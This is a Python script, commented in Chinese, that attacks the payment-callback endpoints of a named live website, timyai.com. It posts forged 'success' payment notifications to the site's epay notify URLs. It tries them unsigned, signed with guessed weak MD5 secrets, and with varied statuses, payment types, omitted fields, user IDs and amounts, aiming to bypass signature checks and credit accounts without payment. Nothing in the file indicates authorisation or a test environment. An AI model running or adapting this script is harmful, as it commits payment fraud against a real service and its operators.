#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
timyai.com 支付接口深度测试
测试签名验证的绕过可能性
"""

import requests
import json
import time
import hashlib
import random
import string

TARGET_URL = "http://timyai.com"

def generate_order_no(user_id=999):
    random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"SUBUSR{user_id}NO{random_str}{int(time.time())}"

def md5_sign(params, secret=""):
    """MD5 签名"""
    sorted_params = sorted(params.items())
    sign_str = '&'.join([f"{k}={v}" for k, v in sorted_params if k != 'sign'])
    sign_str += secret
    return hashlib.md5(sign_str.encode('utf-8')).hexdigest()

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
})

print("="*60)
print("timyai.com 支付接口深度测试")
print("="*60)

# 测试 1: 正常参数（无签名）
print("\n>>> 测试 1: 无签名参数 <<<")
params1 = {
    "trade_no": generate_order_no(999),
    "status": "success",
    "amount": "500.00",
    "param": "user_id_999",
    "time": str(int(time.time())),
    "type": "alipay",
}

for endpoint in ["/api/user/epay/notify", "/api/subscription/epay/notify"]:
    r = session.post(f"{TARGET_URL}{endpoint}", data=params1, timeout=10)
    print(f"  {endpoint}: {r.status_code} - {r.text[:50]}")

# 测试 2: 带 MD5 签名
print("\n>>> 测试 2: 带 MD5 签名 <<<")
# 使用常见的易支付密钥进行测试
secret = "123456"  # 常见测试密钥

for secret_test in ["123456", "abcdef", "test", ""]:
    params2 = {
        "trade_no": generate_order_no(999),
        "status": "success",
        "amount": "500.00",
        "param": "user_id_999",
        "time": str(int(time.time())),
        "type": "alipay",
    }
    params2['sign'] = md5_sign(params2, secret_test)
    
    print(f"\n  密钥测试: {secret_test}")
    for endpoint in ["/api/user/epay/notify"]:
        r = session.post(f"{TARGET_URL}{endpoint}", data=params2, timeout=10)
        print(f"    {endpoint}: {r.status_code} - {r.text[:50]}")

# 测试 3: 尝试不同的状态值
print("\n>>> 测试 3: 不同状态值 <<<")
for status in ["success", "SUCCESS", "TRADE_SUCCESS", "OD", "1"]:
    params3 = {
        "trade_no": generate_order_no(999),
        "status": status,
        "amount": "500.00",
        "param": "user_id_999",
        "time": str(int(time.time())),
        "type": "alipay",
    }
    
    for endpoint in ["/api/user/epay/notify"]:
        r = session.post(f"{TARGET_URL}{endpoint}", data=params3, timeout=10)
        print(f"  {status} @ {endpoint}: {r.status_code} - {r.text[:50]}")

# 测试 4: 尝试不同的支付类型
print("\n>>> 测试 4: 不同支付类型 <<<")
for pay_type in ["alipay", "wxpay", "qqpay", "bank"]:
    params4 = {
        "trade_no": generate_order_no(999),
        "status": "success",
        "amount": "500.00",
        "param": "user_id_999",
        "time": str(int(time.time())),
        "type": pay_type,
    }
    
    for endpoint in ["/api/user/epay/notify"]:
        r = session.post(f"{TARGET_URL}{endpoint}", data=params4, timeout=10)
        print(f"  {pay_type} @ {endpoint}: {r.status_code} - {r.text[:50]}")

# 测试 5: 尝试空的必需参数
print("\n>>> 测试 5: 省略某些参数 <<<")
for omit in ["trade_no", "status", "amount", "type"]:
    params5 = {
        "trade_no": generate_order_no(999),
        "status": "success",
        "amount": "500.00",
        "param": "user_id_999",
        "time": str(int(time.time())),
        "type": "alipay",
    }
    del params5[omit]
    
    for endpoint in ["/api/user/epay/notify"]:
        r = session.post(f"{TARGET_URL}{endpoint}", data=params5, timeout=10)
        print(f"  省略 {omit} @ {endpoint}: {r.status_code} - {r.text[:50]}")

# 测试 6: 尝试伪造已存在的订单号格式
print("\n>>> 测试 6: 真实订单号格式测试 <<<")
# 使用真实用户ID 123（测试用户）
real_user_id = 123
for user_id in [123, 1, 999]:
    params6 = {
        "trade_no": generate_order_no(user_id),
        "status": "success",
        "amount": "500.00",
        "param": f"user_id_{user_id}",
        "time": str(int(time.time())),
        "type": "alipay",
    }
    
    for endpoint in ["/api/user/epay/notify"]:
        r = session.post(f"{TARGET_URL}{endpoint}", data=params6, timeout=10)
        print(f"  user_id={user_id} @ {endpoint}: {r.status_code} - {r.text[:50]}")

# 测试 7: 尝试金额边界值
print("\n>>> 测试 7: 金额边界值测试 <<<")
for amount in ["0.01", "0.10", "1.00", "100.00", "999.99", "0"]:
    params7 = {
        "trade_no": generate_order_no(999),
        "status": "success",
        "amount": amount,
        "param": "user_id_999",
        "time": str(int(time.time())),
        "type": "alipay",
    }
    
    for endpoint in ["/api/user/epay/notify"]:
        r = session.post(f"{TARGET_URL}{endpoint}", data=params7, timeout=10)
        print(f"  amount={amount} @ {endpoint}: {r.status_code} - {r.text[:50]}")

print("\n" + "="*60)
print("测试完成")
print("="*60)